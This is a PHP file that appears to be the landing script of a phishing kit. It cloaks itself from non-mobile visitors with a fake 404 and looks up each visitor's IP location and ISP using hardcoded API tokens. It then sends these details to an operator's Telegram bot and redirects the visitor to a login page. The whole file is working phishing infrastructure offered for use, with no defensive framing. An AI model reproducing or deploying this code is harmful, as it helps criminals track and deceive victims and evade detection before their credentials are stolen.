<?php
session_start();
include('email.php');

function isMobile() {
    return preg_match("/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/", $_SERVER['HTTP_USER_AGENT']);
}

if (!isMobile()) {
    die(header('HTTP/1.0 404 Not Found'));
}

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Récupérer les informations IP avec un premier token
function getIpInfo($ip, $token) {
    $url = "https://ipinfo.io/{$ip}/json?token={$token}";
    $response = @file_get_contents($url);
    if ($response === FALSE) {
        return NULL;
    }
    return json_decode($response, true);
}

// Récupérer les informations IP depuis ip-api.com
function getIpInfoBackup($ip) {
    $url = "http://ip-api.com/json/{$ip}";
    $response = @file_get_contents($url);
    if ($response === FALSE) {
        return NULL;
    }
    return json_decode($response, true);
}

$tokens = ["2ca59437d0ffc0", "autre_token_de_secours"];
$ipinfo_data = null;

foreach ($tokens as $token) {
    $ipinfo_data = getIpInfo($ip, $token);
    if ($ipinfo_data !== NULL) {
        break;
    }
}

// Utiliser le deuxième site si ipinfo.io échoue
if ($ipinfo_data === NULL) {
    $ipinfo_data = getIpInfoBackup($ip);
}

$city = $ipinfo_data['city'] ?? $ipinfo_data['city'] ?? 'Unknown';
$org = $ipinfo_data['org'] ?? $ipinfo_data['isp'] ?? 'Unknown';

$message = "
「 🕷 +1 CLICK 🕷 」
    
「🕸」 NEW CONNECTION DETECTED
            
「☂️」 Adresse ip : {$ip}
「🏙️」 City : {$city}
「🏢」 Organization : {$org}
「☔️」 User Agent : {$user_agent}
";

function curl_request($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

$url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message);
curl_request($url);

header('Location: ./login.php');
?>
